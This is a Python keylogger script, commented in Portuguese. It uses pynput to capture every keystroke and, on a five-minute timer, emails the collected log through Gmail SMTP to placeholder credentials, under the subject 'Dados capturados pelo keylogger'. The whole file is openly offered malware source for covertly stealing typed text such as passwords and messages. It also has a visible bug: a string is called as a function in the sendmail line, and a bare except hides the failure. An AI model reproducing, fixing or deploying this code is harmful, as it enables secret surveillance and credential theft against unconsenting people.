from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Configurações do email
EMAIL_ORIGEM = "xxxxxxxxxxxxx"
EMAIL_DESTINO = "xxxxxxxxxxxxx"
SENHA_EMAIL = "xxxxxxxxxxxxx"

log = ""

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Dados capturados pelo keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.sendmail(EMAIL_ORIGEM, EMAIL_DESTINO())
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar") 
    
        log = ""
    
    Timer(300, enviar_email).start()  # Envia email a cada 5 minutos    
    
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        elif key == keyboard.Key.esc:
            log += " [ESC] "
        else:
            pass  # Ignorar control, shift, alt, etc.
        
# Inicia o keylogger e o envio automático de emails
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()